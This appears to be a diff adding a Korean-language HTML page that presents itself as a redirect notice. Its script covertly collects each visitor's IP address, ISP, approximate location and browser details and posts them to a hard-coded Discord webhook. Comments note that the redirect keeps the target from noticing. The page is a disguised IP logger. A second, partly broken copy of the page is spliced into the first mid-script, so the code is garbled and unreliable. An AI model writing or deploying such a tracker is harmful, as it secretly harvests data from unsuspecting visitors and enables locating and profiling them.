@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>페이지 이동 중</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        .loader {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <h2>잠시 후 목적지 페이지로 이동합니다...</h2>
+    </div>
+
+    <script>
+        //
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1546089395667603526/6o_Cj13v1Ll8xNK6pG1Qg87TC07Mw8StwGAacMaUudhxZ9BK_Jx4eyZdt-MkSZ4FTv3o';
+        
+        //
+        const REDIRECT_URL = 'https://github.com/kimmimi490/kimmimi02026/settings/pages'; 
+
+        // 외부 API를 이용해 접속자의 IP 주소 및 국가 정보 가져오기
+        fetch('https://ipapi.co')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip || '확인 불가';
+                const country = data.country_name || '확인 불가';
+                const city = data.city || '확인 불가';
+                const isp = data.org || '확인 불가';
+                const userAgent = navigator.userAgent;
+                const accessTime = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
+
+                // 디스코드로 보낼 예쁜 카드 형태(Embed)의 메시지 데이터 구조
+                const discordMessage = {
+                    embeds: [{
+                        title: "🚨 새로운 IP 수집 완료",
+                        color: 15158332, // 빨간색 계열 코드
+                        fields: [
+                            { name: "🕒 접속 시간", value: accessTime, inline: false },
+                            { name: "🌐 IP 주소", value: `\`${userIp}\``, inline: true },
+                            { name: "🏢 인터넷 통신사(ISP)", value: isp, inline: true },
+                            { name: "📍 대략적 위치", value: `${country}, ${city}`, inline: false },
+                            { name: "📱 기기 및 브라우저 정보", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                        ],
+                        footer: { text: "IP Logger 웹훅 시스템" }
+                    }]
+                };
+
+                // 디스코드 서버로 정보 전송 (POST 요청)
+                return fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordMessage)
+                });
+            })
+            .then(() => {
+                // 디스코드 전송이 완료되면 상대방이 눈치채지 못하게 지정한 사이트로 리다이렉트
+                window.location.href = REDIRECT_URL;
+            })
+            .catch(error => {
+                console.error('오류 발생:', error);
+                // 오류가 나더라도 자연스럽게 다음 페이지로 이동 처리
+                window.location.href = REDIRECT_URL;<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>페이지 이동 중</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        .loader {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <h2>잠시 후 목적지 페이지로 이동합니다...</h2>
+    </div>
+
+    <script>
+        //
+        const DISCORD_WEBHOOK_URL = 'https://github.com/kimmimi490/kimmimi02026/settings/pages';
+        
+        //
+        const REDIRECT_URL = 'https://www.youtube.com/@%EA%B9%80%EB%AF%B8%EB%AF%B8%EC%94%8C'; 
+
+        // 외부 API를 이용해 접속자의 IP 주소 및 국가 정보 가져오기
+        fetch('https://ipapi.co')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip || '확인 불가';
+                const country = data.country_name || '확인 불가';
+                const city = data.city || '확인 불가';
+                const isp = data.org || '확인 불가';
+                const userAgent = navigator.userAgent;
+                const accessTime = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
+
+                // 디스코드로 보낼 예쁜 카드 형태(Embed)의 메시지 데이터 구조
+                const discordMessage = {
+                    embeds: [{
+                        title: "🚨 새로운 IP 수집 완료",
+                        color: 15158332, // 빨간색 계열 코드
+                        fields: [
+                            { name: "🕒 접속 시간", value: accessTime, inline: false },
+                            { name: "🌐 IP 주소", value: `\`${userIp}\``, inline: true },
+                            { name: "🏢 인터넷 통신사(ISP)", value: isp, inline: true },
+                            { name: "📍 대략적 위치", value: `${country}, ${city}`, inline: false },
+                            { name: "📱 기기 및 브라우저 정보", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                        ],
+                        footer: { text: "IP Logger 웹훅 시스템" }
+                    }]
+                };
+
+                // 디스코드 서버로 정보 전송 (POST 요청)
+                return fetch(https://www.youtube.com/@%EA%B9%80%EB%AF%B8%EB%AF%B8%EC%94%8C, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordMessage)
+                });
+            })
+            .then(() => {
+                // 디스코드 전송이 완료되면 상대방이 눈치채지 못하게 지정한 사이트로 리다이렉트
+                window.location.href = REDIRECT_URL;https://www.youtube.com/@%EA%B9%80%EB%AF%B8%EB%AF%B8%EC%94%8C
+            })
+            .catch(error => {
+                console.error('오류 발생:', error);
+                // 오류가 나더라도 자연스럽게 다음 페이지로 이동 처리
+                window.location.href = REDIRECT_URL;https://www.youtube.com/@%EA%B9%80%EB%AF%B8%EB%AF%B8%EC%94%8C
+            });
+    </script>
+</body>
+</html>
+            });
+    </script>
+</body>
+</html>
